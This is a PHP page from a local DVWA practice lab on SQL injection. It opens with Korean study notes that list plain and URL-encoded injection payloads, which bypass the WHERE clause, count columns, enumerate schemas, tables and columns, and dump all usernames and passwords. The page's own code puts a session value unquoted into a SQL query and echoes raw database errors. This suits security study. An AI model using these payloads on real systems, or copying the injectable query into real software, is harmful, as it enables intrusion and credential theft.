<!--



https://webhack.dynu.net/?idx=20161224.001&print=friendly
https://haruhiism.tistory.com/131?category=832125

high 단계에서는
특수문자 방지 + 세션을 활용한 방법+ limit

특수문자 방지는 전 단계에서 나왔고
limit는 주석처리하면되니 의미가 없다
세션을 활용은


high 단계에서는
'$변수' 구조이다.
주의할점은 ' 을 넣어서 확인하지 말고
'$변수' 가 아닌 무조건 작동하는 $변수 문을 넣어서 어떤 구조인지 파악하라
쿼리문 오류시
세션으로 막아버릴 수 있기때문이다.


세션(session)으로부터 읽어서 쿼리문을 사용한다. 사용자가 서버에 저장된 세션은 값을 조작할 수 있는 방법이 없는 점을 이용한 것
버프스위트를 써도 이를 잡을 수 없다

// WHERE 구문 우회
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1' OR 1=1#
1%27+OR+1%3D1%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------


// UNION을 이용한 칼럼 갯수 알아내기
현재의 쿼리문에서 변개의 칼럼을 이용하고 있는지 알아내는 방법
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1' UNION SELECT 1,1#
1%27+UNION+SELECT+1%2C1%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------


// ORDER BY 구문을 이용한 칼럼 갯수 알아내기
현재의 쿼리문에서 변개의 칼럼을 이용하고 있는지 알아내는 방법
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1' ORDER BY 2#
1%27+ORDER+BY+2%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------


// 모든 데이터베이스 명 조회
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1' UNION SELECT SCHEMA_NAME,1 FROM INFORMATION_SCHEMA.SCHEMATA #
1%27+UNION+SELECT+SCHEMA_NAME%2C1+FROM+INFORMATION_SCHEMA.SCHEMATA+%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------
이를 통해 의심되는 데리터베이스를 찾아낼수 있다
이 과정으로 dvwa라는 데이터베이스안에 관련정보가 있다는 것을 알 수 있다.


// 모든 데이터베이스의 모든 테이블 명 조회*
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#
1%27+UNION+SELECT+TABLE_SCHEMA%2C+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------
이렇게하면 단 직접보고 추론하고 판단해야하지만 어떤 db의 테이블까지 파악이 가능하다.
이 과정으로 dvwa라는 데이터베이스안에 users 라는 테이블에 관련 정보가 있다는 것을 알아낼 수 있다.


// 모든 데이터베이스 모든 테이블 모든 칼럼 조회
--------------------------------------------------------------------------------------------------------------------------------------------------------------
1' UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS#
1%27+UNION+SELECT+TABLE_NAME%2c+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------
이렇게하면 단 직접보고 어떤 db의 테이블의 칼럼인지 파악해야하긴하나 중요한건 시간이 걸려도 뚫린다는 것이다.
이 과정으로 dvwa라는 데이터베이스안에 users 라는 테이블안에 user 칼럼은 아이디를 password 칼럼은 패쓰워드를 갖고 있을 거라는 것을 예상할 수 있다.



//아이디, 비밀번호 탈취
--------------------------------------------------------------------------------------------------------------------------------------------------------------
5' UNION SELECT user,password FROM dvwa.users#
5%27+UNION+SELECT+user%2cpassword+FROM+dvwa.users%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------
현재 이 사이트안에 있는 모든 아이디와 모든 패쓰워드를 탈취했다.
어떤 언어가 됬든
mysqli_real_escape_string()처럼 특수문자처리로는 sql injection을 막을 수 없다는 결론이다

-->



<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">

    <h1>Vulnerability: SQL Injection</h1>
</head>

<script>
    function popUp(z){

        window.open(z, "_blank", "toolbar=yes,scrollbars=yes,resizable=yes,left=500,width=400,height=400");

    }


</script>

<?PHP
include "C:\\xampp\\htdocs\\3.dvwa\\0.db_info.php";




if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    echo $_SESSION[ 'id' ];
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($con,  $query ) or die( '<pre>' . ((is_object($con)) ? mysqli_error($con) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($con))) ? false : $___mysqli_res);
}

?>


<body>
<div class="body_padded">


    <div class="vulnerable_code_area">Click <a href="#" onclick="javascript:popUp('session-input.php');return false;">here to change your ID</a>.

    </div>
</body>
</html>